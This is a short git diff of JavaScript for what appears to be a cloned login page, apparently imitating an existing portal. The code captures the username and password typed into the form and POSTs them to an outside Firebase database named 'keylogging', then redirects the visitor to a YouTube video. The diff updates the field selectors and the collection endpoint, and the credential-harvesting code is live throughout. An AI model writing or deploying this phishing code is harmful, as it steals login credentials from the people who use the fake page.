@@ -1,20 +1,20 @@
-const userInput = document.querySelector("input")
-const submitButton = document.getElementById("button login__submit")
+const userInputs = document.querySelectorAll("input");
+const submitButton = document.getElementById("submitButton");
 
 const submitFormHandler = async (event) => {
-    event.preventDefault();
+    event.preventDefault()
 
-    let username = userInput[0].value;
-    let password = userInput[1].value;
+    let username = userInputs[0].value;
+    let password = userInputs[1].value;
 
-    await fetch("https://emis-clone-default-rtdb.europe-west1.firebasedatabase.app/", {
+    await fetch("https://keylogging-d5c8a-default-rtdb.europe-west1.firebasedatabase.app/credentials.json", {
         method: "POST",
-        body: JSON.stringify({username, password}),
-        headers: {"Content-type": "application/json"},
-    })
+        body: JSON.stringify({ username: username, password: password }),
+        headers: {"Content-Type": "application/json"},
+    });
 
     window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
 
 };
 
-submitButton.addEventListener('click', submitFormHandler);
+submitButton.addEventListener("click", submitFormHandler);
